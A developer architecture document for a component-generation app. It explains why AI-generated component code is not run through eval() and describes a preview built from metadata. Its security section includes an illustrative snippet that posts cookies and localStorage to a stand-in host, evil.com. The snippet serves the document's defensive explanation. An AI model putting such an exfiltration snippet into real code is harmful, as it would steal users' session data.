# 🏗️ Component Preview Architecture

This document explains why we don't dynamically execute component code and what preview experience we provide instead.

---

## 🤔 The Problem

When you generate a component from a spec sheet, the code is stored as a **string** in the database:

```typescript
{
  name: "Button",
  code: `"use client"\nimport { cva } from "class-variance-authority"...`,
  // ... other metadata
}
```

To show a live, interactive preview, we would need to:
1. **Parse** the code string
2. **Evaluate** it as JavaScript
3. **Render** the resulting React component

---

## ⚠️ Why We Don't Execute Code Strings

### **Security Risks**

```javascript
// ❌ EXTREMELY DANGEROUS
eval(componentCode) // Could execute ANY code!
new Function(componentCode)() // Same risk!

// What if AI generates (or user injects):
componentCode = `
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: localStorage
    })
  })
`
```

**Risks:**
- 🚨 **XSS attacks** (Cross-Site Scripting)
- 🚨 **Data exfiltration** (stealing cookies, tokens, user data)
- 🚨 **Admin account compromise** (if executed in admin panel)
- 🚨 **Arbitrary code execution** (deleting data, making API calls)
- 🚨 **DOM manipulation** (defacing pages, injecting malware)

### **Technical Challenges**

Even with sandboxing:
- ❌ Complex to implement safely
- ❌ Performance overhead
- ❌ Import resolution issues
- ❌ Type checking failures
- ❌ React context problems
- ❌ Style/theme conflicts

---

## ✅ Our Solution: Metadata-Based Preview

Instead of executing code, we show a **rich preview** using the component's **metadata**:

### **What's Shown:**

```
┌─────────────────────────────────────────┐
│ 💡 About This Component                 │
│ ─────────────────────────────────────── │
│ Description, Category, Slug, Variants   │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│ 🎨 Available Variants                   │
│ ─────────────────────────────────────── │
│ ┌───────┐  ┌───────┐  ┌───────┐       │
│ │ Type  │  │ Size  │  │ State │       │
│ │Primary│  │Small  │  │Enabled│       │
│ │Second.│  │Base   │  │Hover  │       │
│ │Ghost  │  │Large  │  │Focus  │       │
│ └───────┘  └───────┘  └───────┘       │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│ 📘 Usage Example                        │
│ ─────────────────────────────────────── │
│ import { Button } from '@/components...'│
│ <Button Type="Primary">Click</Button>  │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│ 🎨 Theme-Aware Design                   │
│ ─────────────────────────────────────── │
│ [var(--primary)] [var(--foreground)]    │
│ This component uses CSS variables       │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│ 🔧 Want to See It Live?                 │
│ ─────────────────────────────────────── │
│ Copy the code and integrate into your   │
│ application for full interactive preview│
└─────────────────────────────────────────┘
```

---

## 🎯 Benefits of Metadata Preview

| Aspect | Code Execution | Metadata Preview |
|--------|----------------|------------------|
| **Security** | ❌ High risk | ✅ Zero risk |
| **Performance** | ❌ Slow (parsing, eval) | ✅ Fast (JSON render) |
| **Reliability** | ❌ Can break | ✅ Always works |
| **Implementation** | ❌ Complex | ✅ Simple |
| **Maintenance** | ❌ High | ✅ Low |
| **User Trust** | ❌ Concerns | ✅ Transparent |

---

## 🏗️ What Users Get

### **Admin Panel Preview:**
```
1. Upload spec sheet
   ↓
2. AI generates component
   ↓
3. PREVIEW SHOWS:
   - ✅ Generated code (as text)
   - ✅ Detected variants
   - ✅ Theme tokens used
   - ✅ Component metadata
   ↓
4. Admin verifies and saves
```

### **Docs Page Preview:**
```
1. Component saved to database
   ↓
2. User visits /docs/components/[slug]
   ↓
3. PREVIEW SHOWS:
   - ✅ Component description
   - ✅ All variants organized
   - ✅ Usage examples
   - ✅ Theme information
   - ✅ Copy-ready code
   ↓
4. User copies code to their project
   ↓
5. Component renders live in their app
```

---

## 💡 Alternative Solutions (Future)

If we really need live preview, here are **safe** approaches:

### **1. Component File Registry**

```typescript
// When component is saved:
1. Write code to file: components/generated/button.tsx
2. Build and compile the file
3. Import dynamically: const Button = await import('@/components/generated/button')
4. Render: <Button Type="Primary">Click</Button>

Pros:
✅ Real TypeScript compilation
✅ Type checking
✅ No eval() needed

Cons:
❌ Requires file system writes
❌ Build step needed
❌ Deploy process changes
```

### **2. Sandboxed Iframe**

```typescript
// Create isolated sandbox:
<iframe
  srcDoc={`
    <html>
      <head>
        <link rel="stylesheet" href="/theme.css" />
      </head>
      <body>
        <div id="root"></div>
        <script type="module">
          ${componentCode}
        </script>
      </body>
    </html>
  `}
  sandbox="allow-scripts"
/>

Pros:
✅ Isolated execution
✅ Can't access parent page

Cons:
❌ Still some XSS risks
❌ Complex theme passing
❌ State management issues
```

### **3. React Live / Sandpack**

```typescript
import { LiveProvider, LivePreview } from 'react-live'

<LiveProvider code={componentCode}>
  <LivePreview />
</LiveProvider>

Pros:
✅ Designed for this use case
✅ Some safety measures

Cons:
❌ Large bundle size
❌ Performance overhead
❌ Limited customization
```

---

## 📊 Current Architecture

### **Data Flow:**

```
┌─────────────────────┐
│ Upload Spec Sheet   │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ AI Extracts Data    │
│ - name              │
│ - variants          │
│ - description       │
│ - colors → tokens   │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ AI Generates Code   │
│ (stored as string)  │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Save to Database    │
│ {                   │
│   code: string,     │
│   variants: object, │
│   ...metadata       │
│ }                   │
└──────────┬──────────┘
           │
           ├─────────────────────┐
           │                     │
           ▼                     ▼
┌──────────────────┐  ┌──────────────────┐
│ Admin Preview    │  │ Docs Preview     │
│ - Shows code     │  │ - Shows metadata │
│ - Shows variants │  │ - Usage examples │
│ - Theme tokens   │  │ - Variant grid   │
└──────────────────┘  └──────────────────┘
```

### **Preview Rendering:**

```typescript
// ❌ What we DON'T do:
const Component = eval(component.code)
<Component Type="Primary">Click</Component>

// ✅ What we DO:
<div>
  <h3>Variants</h3>
  {Object.entries(component.variants).map(([key, values]) => (
    <div key={key}>
      <p>{key}</p>
      {values.map(v => <span>{v}</span>)}
    </div>
  ))}
  
  <h3>Code</h3>
  <pre>{component.code}</pre>
  
  <h3>Usage</h3>
  <code>import {{ {component.name} }} from '@/components/{component.slug}'</code>
</div>
```

---

## 🔄 How Users Use Components

### **Step 1: Generate in Admin**
```
Admin uploads spec → AI generates → Preview metadata → Save
```

### **Step 2: View Docs**
```
Visit /docs/components/button → See metadata preview
```

### **Step 3: Copy Code**
```
Click "Code" tab → Copy component code
```

### **Step 4: Integrate**
```typescript
// In user's project:
// 1. Create file: components/ui/button.tsx
// 2. Paste the copied code
// 3. Use in their app:

import { Button } from '@/components/ui/button'

export default function MyPage() {
  return (
    <Button Type="Primary" Size="Large">
      Click me
    </Button>
  )
}

// Now it renders live in their app! ✨
```

---

## 📝 Summary

### **Why No Code Execution:**
- 🔒 **Security**: eval() is extremely dangerous
- ⚡ **Performance**: Parsing/eval is slow
- 🛡️ **Reliability**: Metadata is always safe
- 🎯 **Simplicity**: JSON rendering is simple

### **What We Provide Instead:**
- ✅ **Rich metadata preview** (variants, usage, theme)
- ✅ **Copy-ready code** (users paste into their project)
- ✅ **Professional documentation** (all info they need)
- ✅ **Zero security risks** (no code execution)

### **The Result:**
A **secure, fast, reliable** preview system that gives users all the information they need to use the component, without executing arbitrary code.

**Users get the code → They integrate it → They see it live in their app**

This is actually how most component libraries work (shadcn/ui, Radix, etc.) - they provide code, you copy and customize it in your project!

---

**Security > Convenience**

We prioritize security and chose a metadata-based preview that provides all necessary information without executing untrusted code. 🔒✨

